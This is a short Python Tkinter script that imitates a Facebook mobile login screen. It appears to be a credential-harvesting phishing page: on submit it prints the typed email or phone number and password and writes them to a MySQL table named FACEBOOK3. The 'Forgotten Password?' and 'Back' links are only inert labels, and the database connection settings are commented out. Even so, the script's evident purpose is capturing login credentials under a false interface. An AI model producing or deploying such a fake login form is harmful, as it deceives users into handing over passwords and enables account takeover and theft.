from tkinter import *
from PIL import Image, ImageTk
root = Tk()
root.geometry("320x568")
emailobj = StringVar()
emailobj.set("Phone number or email address")
passobj = StringVar()
passobj.set("Password")
e = p = " "
def db1():
    global e,p
    import mysql.connector
    mydb = mysql.connector.connect(
        #host = "localhost",
        #username = "root",
        #password = "",
        #database = "FACEBOOK2"
        )
    mycursor = mydb.cursor()
    sql = "insert into FACEBOOK3 (EMAIL1, PASS1) values (%s,%s)"
    val = (e,p)
    mycursor.execute(sql,val)
    mydb.commit()
def storedata():
    global e,p, emailobj, passobj
    e = emailobj.get()
    p = passobj.get()
    print(e)
    print(p)
    db1()
newsizebg = (400,175)
bg = Image.open("nfb.png")
bg = bg.resize(newsizebg)
test0 = ImageTk.PhotoImage(bg)
top = Label(root, image = test0).place(relx = 0.5, rely = 0.1, anchor = CENTER)
Email = Entry(root, textvariable = emailobj, width = 32, fg = "grey").place(relx = 0.5, rely = 0.3, anchor = CENTER)
Pass = Entry(root, textvariable = passobj, width = 32, fg = "grey").place(relx = 0.5, rely = 0.35, anchor = CENTER)
size1 = (298,30)
submitbtn = Image.open("button.png")
submitbtn = submitbtn.resize(size1)
test1 = ImageTk.PhotoImage(submitbtn)
Submit = Button(root, image = test1, command = storedata).place(relx = 0.5, rely = 0.45, anchor = CENTER)
fp = Label(root, text = "Forgotten Password?", fg = "blue").place(relx = 0.5, rely = 0.55, anchor = CENTER)
back = Label(root, text = "Back", fg = "blue").place(relx = 0.5, rely = 0.60, anchor = CENTER)
size2 = (270,60)
end = Image.open("cacc.png")
end = end.resize(size2)
test2 = ImageTk.PhotoImage(end)
bottom = Label(root, image = test2).place(relx = 0.5, rely = 1, anchor = S)
root.mainloop()
